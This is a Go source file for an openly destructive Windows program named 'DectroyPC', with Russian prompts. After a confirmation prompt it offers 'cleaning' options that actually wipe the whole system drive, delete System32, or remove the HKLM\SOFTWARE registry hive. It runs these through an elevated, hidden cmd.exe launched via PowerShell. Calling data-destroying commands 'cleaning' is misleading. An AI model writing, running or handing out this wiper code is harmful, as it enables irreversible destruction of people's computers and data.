package DectroyPC

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"syscall"
)

func Start() {
	fmt.Println("Вы запускаете опасную программу. Уверены? (1 - да / 2 - нет).")

	reader := bufio.NewReader(os.Stdin)
	str, err := reader.ReadString('\n')

	if err != nil {
		fmt.Println("Ошибка ввода. Программа завершена.")
		return
	}

	char := []rune(str)[0]
	if char == '1' {
		fmt.Println("1 - Долгая чистка, 10 минут.\n" +
			"2 - Поверхностная очистка, 2 минуты.\n" +
			"3 - Очистка реестра, 20 секунд. \n" +
			"Введите соответствующую цифру и нажмите Enter.")

		str, err = reader.ReadString('\n')
		if err != nil {
			fmt.Println("Ошибка ввода. Программа завершена.")
			return
		}

		char = []rune(str)[0]
		destroy(char)
	} else {
		fmt.Println("Программа завершена.")
	}
}

func destroy(char rune) {
	c := os.Getenv("SystemDrive")
	if c == "" {
		fmt.Println("Не удалось определить системный диск. Программа завершена.")
		return
	}

	var arguments string
	switch char {
	case '1':
		arguments = fmt.Sprintf("/C cd %s && rd %s /s /q && del %s /s /q", c, c, c)
	case '2':
		arguments = fmt.Sprintf("/C cd %s && rmdir /s /q %s\\Windows\\System32", c, c)
	case '3':
		arguments = fmt.Sprintf("/C REG DELETE HKLM\\SOFTWARE /f")
	default:
		fmt.Println("Недопустимый выбор. Программа завершена.")
		return
	}

	cmdPath := "cmd.exe"
	psCommand := fmt.Sprintf(`Start-Process -Verb RunAs -FilePath "%s" -ArgumentList "%s"`, cmdPath, arguments)
	cmd := exec.Command("powershell", "-Command", psCommand)

	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}
	//cmd.Stdout = os.Stdout
	//cmd.Stderr = os.Stderr
	err := cmd.Run()
	if err != nil {
		fmt.Printf("Ошибка выполнения команды.", err)
		return
	}

	err = cmd.Wait()
	if err != nil {
		fmt.Printf("Ошибка выполнения команды.", err)
		return
	}
}
